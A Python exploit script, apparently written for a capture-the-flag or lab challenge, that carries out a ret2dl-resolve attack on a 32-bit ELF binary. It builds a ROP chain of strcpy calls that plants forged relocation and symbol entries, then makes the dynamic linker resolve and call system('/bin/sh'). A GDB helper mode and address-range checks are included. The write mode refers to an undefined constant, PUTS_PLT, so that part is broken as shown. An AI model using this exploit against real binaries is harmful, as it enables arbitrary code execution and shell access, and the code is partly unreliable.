import sys

PUTS_PLT_DL_RESOLVE = 0x0804838b
STRCPY_PLT = 0x08048370
POP2_RET = 0x080485fa
ELF_BASE = 0x08048000
ELF_SIZE = 0x1000
WORD_SIZE = 4

elf_data = bytes()

def byte_addr(b):
    return ELF_BASE+elf_data.find(bytes([b]))
    
def le(x):
    return x.to_bytes(WORD_SIZE, byteorder='little')

def pad(n):
    return bytes("\x00"*n,'ascii')

def strcpy(dst, src):
    return le(STRCPY_PLT) + le(POP2_RET) + le(dst) + le(src)

def write_bytes(dst, content):
    ans = bytes()
    for b in content:
        src = byte_addr(b)
        print("0x{:02x} @ 0x{:08x} -> 0x{:08x}".format(b, src,dst))
        ans += strcpy(dst,src)
        dst += 1
    return ans

JMPREL=0x80482f8
SYMTAB=0x80481cc
VERSYM=0x80482bc
STRTAB=0x804825c

wstart = 0x804a000
wend = 0x804b000
zstart = 0x80487b0
zend = 0x8048f0c

reloc_idx=0x2020
symbol_idx=0x2d0
link_map=0x80487f0
name_offset=0x1ecc
arg_addr = 0x804afc0
got_addr = 0x804a014

reloc=JMPREL + reloc_idx
sym_addr=SYMTAB + 16*symbol_idx
name_addr=STRTAB + name_offset
reloc_val = (symbol_idx << 8) + 0x07

writes = {
    sym_addr:     name_offset.to_bytes(4,byteorder='little'),       # st_name = name offset
    sym_addr+0xd: int(0x0).to_bytes(1,byteorder='little'),  # st_other = 0x0
    reloc:        got_addr.to_bytes(4,byteorder='little'),  # r_address = GOT address to write
    reloc+4:      reloc_val.to_bytes(4,byteorder='little'), # r_info = symbol_offset:3, 0x7:1 
    name_addr:    bytes("system\x00",'ascii'),
    arg_addr:     bytes("/bin/sh\x00",'ascii')
}

if len(sys.argv) == 2 and sys.argv[1] == "check":
    print("{} < reloc_idx < {}".format(hex(wstart-JMPREL), hex(wend-JMPREL)))
    print("{} < symbol_idx < {}".format(hex((wstart-SYMTAB)//16), hex((wend-SYMTAB)//16)))
    print("{} < symbol_idx < {}".format(hex((zstart-VERSYM)//2), hex((zend-VERSYM)//2)))
    print("{} < link_map < {}".format(hex(zstart), hex(zend)))
    print("{} < name_addr < {}".format(hex(wstart), hex(wend)))
    print("{} < arg_addr < {}".format(hex(wstart), hex(wend)))
    print("{} < name_offset < {}".format(hex(wstart-STRTAB), hex(wend-STRTAB)))
    exit()

elif len(sys.argv) == 2 and sys.argv[1] == "print":
    for i in writes:
        print(hex(i),writes[i])
        v = int.from_bytes(writes[i],byteorder='little')
        if not (wstart < i and i < wend):
            print("PROBLEM: {} -> {}".format(hex(i),hex(v)))

elif len(sys.argv) == 3 and sys.argv[1] == "write":
    with open(sys.argv[2],"rb") as f:
        elf_data = f.read(ELF_SIZE)
        
    payload = pad(20)
    for x in sorted(writes.keys()):
        payload += write_bytes(x,writes[x])
    payload += le(PUTS_PLT)
    payload += le(reloc_idx)
    payload += le(link_map) 
    payload += le(arg_addr)
    with open("payload","wb") as f:
        f.write(payload)
    
elif len(sys.argv) < 2:
    import gdb
    gdb.execute("b *0x8048559")
    gdb.execute("""shell perl -e 'print "\\x00"x20 . "\\x8b\\x83\\x04\\x08"' > payload_dumb""")
    gdb.execute("""r payload_dumb a""")
    gdb.execute("b *_dl_fixup+183") # lookup the symbol
    gdb.execute("b *_dl_fixup+229") # should we call the function immediately
    esp = int(gdb.parse_and_eval("$esp"))
    gdb.selected_inferior().write_memory(esp+4,reloc_idx.to_bytes(4,byteorder='little'))
    gdb.selected_inferior().write_memory(esp+8,link_map.to_bytes(4,byteorder='little'))
    gdb.selected_inferior().write_memory(esp+12,arg_addr.to_bytes(4,byteorder='little'))
    
    for i in writes:
        gdb.selected_inferior().write_memory(i,writes[i])
